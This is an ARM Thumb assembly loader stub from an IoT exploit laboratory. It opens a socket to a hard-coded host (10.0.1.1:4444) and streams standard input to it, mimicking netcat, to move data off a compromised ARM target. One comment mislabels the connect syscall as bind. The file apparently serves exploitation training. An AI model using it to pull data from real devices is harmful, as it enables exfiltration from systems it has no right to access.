/* From standard input to socket
 * Loader stub to facilitate
 * transferring data from an
 * ARM target to another host
 *
 * mimics the behaviour of:
 *
 * nc <ip_addr> 4444
 *
 * Note that this utility does not
 * support any command line arguments
 * because it has to be minimal.
 *
 * If you want to change the IP address
 * and the port, there is a utility
 * included to do so, by patching the
 * literal pool.
 *
 * by Saumil Shah
 *    ARM IoT Exploit Laboratory
 */

.section .text
.global _start
_start:
    .code 32
    adr     r1, THUMB+1
    bx      r1

THUMB:
    .code 16
    // socket(2, 1, 0)
    mov     r0, #2
    mov     r1, #1
    eor     r2, r2, r2         // set r2 to null
    mov     r7, #200           // r7 = 281 (socket)
    add     r7, #81
    svc     #0                 // r0 = host_sockid value
    mov     r4, r0             // save host_sockid in r4

    // connect(r0, &sockaddr, 16)
    adr     r1, SOCKADDR       // pointer to address, port
    mov     r2, #16            // struct address length
    add     r7, #2             // r7 = 283 (bind)
    svc     #0

    // set aside 1024 bytes of stack space for buffer
    mov     r3, #1
    lsl     r3, #10            // r3 = 1024
    mov     r1, sp             // r1 = buf
    sub     r1, r1, r3
    mov     sp, r1

READ_WRITE_LOOP:

    // read(STDIN, buf, 1024)
    mov     r0, #0             // r0 = 0 (stdin)
    mov     r2, r3             // count (1024)
    mov     r7, #3             // r7 = read
    svc     #0
    
    // write(sockfd, buf, count)
    mov     r2, r0             // number of bytes read
    mov     r0, r4             // r0 = socket
    mov     r7, #4             // r7 = write
    svc     #0

    cmp     r2, #0             // did we any bytes?
    bgt     READ_WRITE_LOOP    // yes, read some more

    // close(sockfd)
    mov     r0, r4             // r0 = socket
    mov     r7, #6             // r7 = close
    svc     #0

    // exit(0)
    eor     r0, r0, r0
    mov     r7, #1             // r7 = exit
    svc     #0

.balign 4

SOCKADDR:
    .ascii "\x02\x00"          // AF_INET
    .ascii "\x11\x5c"          // port number 4444
    .byte  10,0,1,1            // IP Address
